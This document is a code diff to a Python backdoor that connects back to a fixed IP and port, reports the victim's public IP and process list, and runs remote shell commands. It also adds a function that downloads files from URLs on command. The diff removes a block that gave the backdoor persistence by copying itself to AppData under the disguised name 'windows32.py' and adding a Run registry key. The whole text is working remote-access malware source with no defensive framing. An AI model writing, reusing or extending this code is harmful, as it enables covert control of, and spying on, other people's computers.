@@ -24,7 +24,7 @@ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
 ip = "192.168.1.7"
-port = 4444
+port = 4445
 ipadd = get('https://api.ipify.org').text
 
 class back:
@@ -75,7 +75,6 @@ class back:
                 processID = proc.pid
                 for_send = f"{num}. {processName} ::: {processID}\n"
                 num +=1
-                print(for_send)
                 s.send(for_send.encode())
             except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                 pass
@@ -101,6 +100,11 @@ class back:
     
     def open_url(self, link):
         webbrowser.open_new(link)
+    def download(self, url):
+        get = requests.get(url)
+        file_name = url.split("/")[-1]
+        with open(file_name, "wb") as file:
+            file.write(get.content)
                 
     def shell(self):
         while True:
@@ -152,7 +156,8 @@ class back:
             elif (cmd[:7] == "install"):
                 try:
                     to_download = cmd[:-1]
-                    self.download(to_download[4:])
+                    print(to_download[8:])
+                    self.download(to_download[8:])
                 except:
                     s.send(b"\n[!] Can't Fetch the file!!\n")
             else:
@@ -162,12 +167,6 @@ class back:
                 except:
                     continue
                 s.send(result.encode())
-        
-    def download(self, url):
-        get = requests.get(url)
-        file_name = url.split("/")[-1]
-        with open(file_name, "wb") as file:
-            file.write(get.content)
 
     def main(self):
         while True:
@@ -183,17 +182,12 @@ class back:
                 time.sleep(3)
         banner = (
                     "\n==============================================\n"+
-                    f"|| IP:      -- {ipadd}                 ||\n"+
+                    f"|| IP:      --  {ipadd}               ||\n"+
                      "|| help     -- Shows extra commands         || \n"+
                      "==============================================\n")
         s.send(banner.encode())
 
         self.shell()
-
-location = os.environ["appdata"] + "\\windows32.py"
-if not os.path.exists(location):
-    shutil.copyfile(sys.executable, location)
-    subprocess.call('REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Windows32 /t REG_SZ /d"' + location +'"', shell=True)
 
 backdoor = back()
 backdoor.main()
